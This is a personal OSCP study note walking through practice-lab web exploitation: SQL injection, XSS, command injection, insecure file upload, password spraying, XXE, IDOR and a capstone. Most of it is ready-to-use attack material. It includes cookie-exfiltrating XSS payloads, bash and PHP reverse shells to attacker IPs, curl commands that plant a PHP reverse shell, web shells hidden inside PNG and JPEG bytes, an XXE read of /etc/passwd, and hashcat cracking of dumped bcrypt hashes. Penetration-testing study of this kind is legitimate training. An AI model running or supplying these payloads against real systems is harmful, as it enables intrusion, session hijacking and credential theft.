---
aliases:
  - Web Application Exploitation
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - web_application
  - exploitation
author: Mehdi N Tehrani
creat_date: 2023-12-11
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# SQL Injection
#sql_injection

Connect to  mysql database:
#mysql #connect 
`mysql -h <server> -u <user> -p<password> -P<port>`
Get all databases;
`show databases;`

Comment Out: `#` or `-- -` 
version: `@@version` or `version()`

[PortSwigger - SQL Injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) #portswigger #cheetsheet

## Lab 1
Attacks: 
1. `' or 1=1; #`: get all users and email
2. `jeremy' union select null,null,null#`:  try this to find out how many columns are in this table
3. `jeremy' union select table_name, null, @@version FROM information_schema.tables; #`: get all table names and mysql version
4. `jeremy' union select column_name from information_schema.columns where table_name like "injection0x01"; #`: get all columns in *injection0x01* table
5. `jeremy' union select username, email, password FROM injection0x01; #`: get username, email, password for all users

other variations:
`jeremy' union select null, null, password from injection0x01;-- -`

> if a column data type is int, null should be written as `null(int)`


## Lab 2
1. Use BurpSuite to examine the http request
2. Use sqlmap #sqlmap to find out which fields are injectable
`sqlmap -r request.txt`
 3. After using the default credentials provided, a cookie gets set. Cookie seems vulnerable to sql injection: 
 - `Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#` can login successfully
 - `Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1='1#` also works
 - `Cookie: session=' or 1='1#`

- Using SQLmap for *cookie* header:
	- `sqlmap -r request.txt --level=2 --dump -T <table_name>`

## Lab 3
`x' or 1=1#`
`x' union select 1#`: no items returned
`x' union select 1,2,3,4#`: one item returned and number 2 is viewable; select query requires 4 items
`x' union select null,table_name,null,null from information_schema.tables#`: Leaked table name: **injection0x03_users**
`x' union select null,column_name,null,null from information_schema.columns where table_name = 'injection0x03_users'#`: Leaked column names: **username, password**
`x' union select null,username,null,null from injection0x03_users#`: Leaked username: **takeshi**
`x' union select null,password,null,null from injection0x03_users#`: Leaked password: **onigirigadaisuki**

Alternatively sqlmap can be used:
`sqlmap -r request.txt -T injection0x03_users --dump`

# XSS
#xss #cross_site_scripting
Run JavaScript in victim's browser
- first try HTML injection as that's more likely to work first e.g. `<h1>Hello!</h1>`
- Use [Firefox Multi-account container extension](https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/) to have tabs with separate instances of the website e.g. login account, cookies, etc. This is specially useful for stored xss attacks where with a separate container we can check if the uploaded payload has been stored.

## Reflected
#reflected_xss
`alert(1)`
`print()`
`prompt('1')`
https://portswigger.net/research/alert-is-dead-long-live-print

Key Logger #key_logger_javascript #javascript
```javascript
function keylog(event) { console.log(event.key) }
document.addEventListener('keydown', keylog)
```


## Stored
#stored_xss
### Lab 3 xss0x03
Attack:
`<script>fetch('http://<url>/'+encodeURI(document.cookie))</script>`
or
`<script>fetch('http://<url>/', { method: 'POST', body: encodeURI(document.cookie) });</script>`
or
`<script>var i=new Image;i.src="http://<url>/?"+document.cookie</script>`
Set up netcat locally or use https://webhook.site to receive the posted value.
!
## DOM-based
#dom_based_xss
if the input doesn't make any call backs to the server and only updates the DOM, the attack will be DOM-based

example: *xss0x01 lab*
`<img src=# onerror="window.location.href='https://archlinux.org'"/>` redirects user to another location
`<img src=# onerror="fetch('http://192.168.122.142:8000', { method: 'GET' })"/>` makes the call to the listener
`<img src=# onerror="fetch('http://192.168.122.142:8000', { method: 'GET', body: '  ' })"/>` : didn't work!


# Command Injection
#command_injection
abuse `eval` in javascript and `system` in php

#curl #get_response_code
`curl -I -s -L $url | grep -i http | grep -oE '\d{3}'`:  only get response status code

## lab 0x01
Attacks:
`; bash -i >& /dev/tcp/<ip>/<port> 0>&1 #`
`; whoami #`
`; cat /etc/passwd #`

`; which php #`
`; /usr/local/bin/php -r '$s=fsockopen("<attacker_ip>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");' #`

## lab 0x02
A technique for 
Attacks:
- Find php path: `/usr/local/bin/php`
`https://tcm-sec.com && B=$(which php) && curl http://<ip>:<port> -X POST -d "$B" #`
- Find curl path: `/usr/bin/curl`
```
https://tcm-sec.com && B=$(which curl) && curl http://<ip>:<port>/?`which curl` #
```
- Build payload:
`cp /usr/share/webshells/laudanum/php/php-reverse-shell.php ./rev.php`
and update the file to point to the attacker's listening endpoint
- Upload rev.php to the server
`https://tcm-sec.com && curl http://192.168.122.142:8030/rev.php -o /var/www/html/rev.php`
- set up the listener on the attacker's machine
- Run the php file
`https://tcm-sec.com && /usr/local/bin/php /var/www/html/rev.php`
or 
navigate to `http://<server>/rev.php`

## lab 0x03
[payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk)
Reconn:
- `100)^2) + ((-200)^2)); system("which bash") }' #`    `/bin/bash`
- `100)^2) + ((-200)^2)); system("which php") }' #`   `/usr/local/bin/php`
- `100)^2) + ((-200)^2)); system("which curl") }' #`   `/usr/bin/curl`

Attack:
- `100)^2))}';php -r '$s=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'; #`
alternatively:
- build a php reverse shell payload (copy from `/usr/share/laudanum/php/php-reverse-shell.php` and update with ip and port of attacker)
- `100)^2) + ((-200)^2)); system("curl http://<attacker_endpoint>/rev.php -o .") }' #` : upload rev_shell code to victim
- navigate to `http://localhost/rev.php`: set up listener in attacker's machine and run the shell code

# Insecure File Upload
#insecure_file_upload #file_upload
References:
- [Port](https://portswigger.net/web-security/file-upload)
- [appsecexplained](https://appsecexplained.gitbook.io/appsecexplained/)
- [appsecexplain - insecure file upload](https://appsecexplained.gitbook.io/appsecexplained/common-vulns/insecure-file-upload)
## insecure_fileupload 0x01
- Use BurpSuite to intercept the http call and find out if an executable file can be uploaded.
- update the http body to the following, so a file named `cmd.php` gets uploaded to the server. When we navigate to the uploaded file e.g. `/labs/uploads/cmd.php?cmd=shell_code` the shell_code command will be passed by `$_GET` to system and gets executed.
```
------WebKitFormBoundaryEGOVbAnBQ0OJefSS
Content-Disposition: form-data; name="uploaded_file"; filename="cmd.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryEGOVbAnBQ0OJefSS--
```
- use *ffuf* #ffuf to find where the file is getting uploaded to: `/labs/uploads`
- build rev.php from `/usr/share/laudanum/php/php-reverse-shell.php`
- upload rev.php by navigating to `http://localhost/labs/uploads/cmd.php?cmd=curl%20http://<attacker_endpoint>:<port>/rev.php%20-o%20.`


## insecure_fileupload 0x02
in this case, file type is getting checked at server side as well as client side. So uploading cmd.php in its original form is not possible.
Still need to use BurpSuite to bypass client-side file check, but can embed the php script between the magic bytes at the top of the file and some at the bottom of the file. 
```
------WebKitFormBoundaryBfx3xX3sVEQh4rAW
Content-Disposition: form-data; name="uploaded_file"; filename="cmd2.php"
Content-Type: image/png

¬âPNG

   
IHDR  h  h   z√•a√ï   gAMA  ¬±¬è√ºa    cHRM  z&  ¬Ä¬Ñ  √∫   ¬Ä√®  u0  √™`  :¬ò  p¬ú¬∫Q<   bKGD √ø √ø √ø¬†¬Ω¬ß¬ì   tIME√ß*%¬èd¬æ√ê  DIDATx√ö√≠¬Ωxdgy√∂4√í¬å¬¶√è¬ú~√ûz√é√åH[√ù{√É¬Öf¬õjl√Ä¬¶√õ√¥√ê1%!¬¶√Ö!@h	¬Ñ
<?php system($_GET['cmd']); ?>
√è¬´√î*¬ï¬°√ë√º¬ûl  XB¬∏¬¢%7u
√°√©                                                                                                                                                                                                                                           X¬ï√º?@¬ª5q√∏gP   %tEXtdate:create 2023-08-15T06:42:37+00:00¬û[¬Öm   %tEXtdate:modify 2023-08-15T06:42:37+00:00√Ø=√ë    IEND¬ÆB`¬Ç
------WebKitFormBoundaryBfx3xX3sVEQh4rAW--

```
- navigate to `http://localhost/labs/uploads/cmd2.php?cmd=whoami`
- response:
```
ÔøΩPNG  IHDRhhzÔøΩaÔøΩgAMAÔøΩÔøΩÔøΩa cHRMz&ÔøΩÔøΩÔøΩÔøΩÔøΩu0ÔøΩ`:ÔøΩpÔøΩÔøΩQ<ÔøΩbKGDÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩtIMEÔøΩ*%ÔøΩdÔøΩÔøΩDIDATxÔøΩÔøΩÔøΩxdgyÔøΩ4“åÔøΩœú~ÔøΩzÔøΩÔøΩH[ÔøΩ{√ÖfÔøΩjlÔøΩÔøΩÔøΩÔøΩÔøΩ1%!ÔøΩÔøΩ!@h ÔøΩ www-data œ´ÔøΩ*ÔøΩÔøΩÔøΩÔøΩÔøΩlXBÔøΩÔøΩ%7u ÔøΩÔøΩXÔøΩÔøΩ?@ÔøΩ5qÔøΩgP%tEXtdate:create2023-08-15T06:42:37+00:00ÔøΩ[ÔøΩm%tEXtdate:modify2023-08-15T06:42:37+00:00ÔøΩ=ÔøΩIENDÔøΩB`ÔøΩ
```
## insecure_fileupload 0x03
- check if client-side or server-side insecure file upload is in place: examining requests shows client-side is in place like previous labs
- bypass client-side file type check with changing the file extension to .php. This reveals a server-side check is also implemented
- upload a jpeg file and use the request in BurpSuite to only keep the beginning and end of the jpeg bytes and insert php command `<?php system($_GET['cmd']) ?>`
- upload the script obfuscated inside the jpeg file with .php5 extension. This gets uploaded, but when examined it doesn't seem to run the script
- try with `.phtml`: this works just fine!

# Authentication Attacks
#authentication_attacks #attack_authentication

## Lab a0x01
### Method 1 - ffuf
much faster than burpsuite.
- add request into a txt file and replace password with the word `FUZZ`
- `ffuf -request ./auth1-req-fuzz.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt -fs 1814`
- `-fs`: filters out any response with the length of 1814. After a few attempts we can see the wrong password results in length of 1814
### Method 2 - BurpSuite
Sniper attack using wordlist `/usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt`

## Lab a0x02
intercept `jessamy`'s MFA log in and replace `jessamy` with `jeremy`. The vulnerability is the MFA code working for any user!

## Lab a0x03
Clusterbomb attack targets two points for fuzzing. The request payload can be prepared like this:
`username=FUZZUSER&password=FUZZPASS`
Can use burpsuite or ffuf:
As lockout policy is set to 5, we can build a list of 4 most common passwords `pass_list_4.txt` and password sprat against a list of common user names:
`$ ffuf -request ./auth3-req-fuzz.txt -request-proto http -mode clusterbomb -w ./pass_list_4.txt:FUZZPASS -w /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3256,3356`

# XXE
#xxe #external_entities_injection
[Reference](https://portswigger.net/web-security/xxe#what-are-the-types-of-xxe-attacks)

we can create a custom variable (entity) named xxe for example - below. Get the receiving system to resolve it.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
	<!ELEMENT creds ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<creds><username></username><password></password></creds>
```

# IDOR
#idor #insecure_direct_object_reference
*Insecure Direct Object Reference (IDOR)*
a.k.a. *Broken Object Level Authorization (BOLA)* #bola #broken_object_level_authorization
[Reference](https://portswigger.net/web-security/access-control/idor)

if value of param id can be changed and server responds, when it's not supposed to
http://server:port/resource?id=123

```
python3 -c 'for i in range (1, 2001): print(i)' > num.txt

ffuf -u 'http://localhost/labs/e0x02.php?account=MYFUZZ' -w ./num.txt:MYFUZZ -fs 849 | rg -oe "\d{4}" > account_numbers.txt

for i in $(cat ./account_numbers.txt)
do
	resp=$(curl -s "http://localhost/labs/e0x02.php?account=$i")
	user_type=$(echo $resp | rg -oe "Type:\s(.*?)<" -r '$1')
	user=$(echo $resp | rg -oe "Username:\s(.*?)<" -r '$1')
	echo -e "$user_type:\t$user" >> user_types.txt
done

cat user_types.txt | rg "admin"
```


# Capstone
Potential vulnerabilities:

## XSS in 'Add Rating' text box
html injection was successful 
- [ ] try xss
```
<img src=x onerror="fetch('http://192.168.122.142:8000/rev.php'" />

<script>fetch('http://192.168.122.142:8000/rev.php', { mode: 'no-cors' })</script>
```

## ffuf
```
$ ffuf -u 'http://localhost/capstone/FUZZ' -w /usr/share/wordlists/dirb/common.txt

.hta
.htaccess
.htpasswd
admin
assets
index.php
```

- [ ] `http://localhost/capstone/admin`: 403 response

`http://localhost/capstone/assets`: 403 response

## directory traversal
failed

## Post-login
- [ ] sql injection to PHPSESSID

## query string in DOM
- [ ] the URL below leads to the following text appearing in the webpage: `You successfully logged in!`
```
http://localhost/capstone/index.php?message=You%20successfully%20logged%20in!
```


## coffee.php?coffee=1 
SQL injection
```
http://localhost/capstone/coffee.php?coffee=1'+union+select+9,column_name,7,6,5,4,3+from+information_schema.columns+where+table_name%3d'users'--+-
```

table: `users`
columns:
- `user_id`
- `username`
- `password`
- `type`

| username | password                                                     | type  |
| -------- | ------------------------------------------------------------ | ----- |
| jeremy   | $2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy | admin |
| jessamy  | $2y$10$meh2WXtPZgzZPZrjAmHi2ObKk6uXd2yZio7EB8t.MVuV1KwhWv6yS | admin |
| raj      | $2y$10$cCXaMFLC.ymTSqu1whYWbuU38RBN900NutjYBvCClqh.UHHg/XfFy | admin |
| bob      | $2y$10$ojC8YCMKX2r/Suqco/h.TOFTIaw5k3Io5FVSCeWjCCqL8GWwmAczC |       |
| maria    | $2y$10$EPM4Unjn4wnn4SjoEPJu7em6OLISImA50QS3T1jCLyh48d7Pv6KBi |       |
| amir     | $2y$10$qAXjb233b7CMHc69CU.8ueluFWZDt9f08.XYJjsJ.EfC/O5JGSOqW |       |
| xinyi    | $2y$10$37gojoTFmj86E6NbENGg9e2Xu2z6OKKSgnjYxDkXJn/8dvSk2tKfG |       |
| kofi     | $2y$10$5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3. |       |

crack Jeremy's password: #blowfish_hash
`$ hashcat -m 3200 '$2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy' /usr/share/wordlists/rockyou.txt`
password: `captain1`

- login with jeremy admin account and upload a png file with embedded php code with .php extension.
- embedded php code: `<?php system($_GET['c']) ?>`

`which bash`: `/bin/bash`
`which curl`: `/usr/bin/curl`
`which php`: `/usr/local/bin/php`

payload: `'$sock=fsockopen("192.168.122.142",7777);exec("/bin/sh -i <&3 >&3 2>&3");'`

URL to call: `/capstone/assets/13.php?c=/usr/local/bin/php+-r+'$sock%3dfsockopen("192.168.122.142",7777)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'`

